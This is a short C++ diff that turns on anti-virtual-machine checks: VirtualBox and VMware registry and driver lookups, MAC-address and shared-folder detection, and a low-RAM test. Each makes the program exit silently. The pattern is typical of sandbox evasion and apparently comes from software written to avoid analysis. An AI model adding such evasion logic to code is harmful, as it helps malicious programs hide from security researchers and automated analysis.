@@ -22,17 +22,20 @@ public:
 
         // VirtualBox keys
         const std::wstring virtualboxSubKey = s2ws("SOFTWARE\\Oracle\\VirtualBox Guest Additions");
-        //bool virtualboxCheck = CheckRegistryKeyExists(HKEY_LOCAL_MACHINE, virtualboxSubKey);
+        bool virtualboxCheck = CheckRegistryKeyExists(HKEY_LOCAL_MACHINE, virtualboxSubKey);
 
 
-        //if (vmwareProviderNameCheck || virtualboxCheck || vmwareDriverDescCheck) {
-        if (vmwareProviderNameCheck || vmwareDriverDescCheck) {
+        if (vmwareProviderNameCheck || virtualboxCheck || vmwareDriverDescCheck) {
 			exit(0);
         }
 
-        //checkProvider();
-        //detectVMViaMac();   
+        checkProvider();
+        detectVMViaMac();   
         checkVirtualBoxSharedFolders();
+        int ram = getRam();
+        if (ram < 1024) {
+		    exit(0);
+		}
 	}
 
 private:
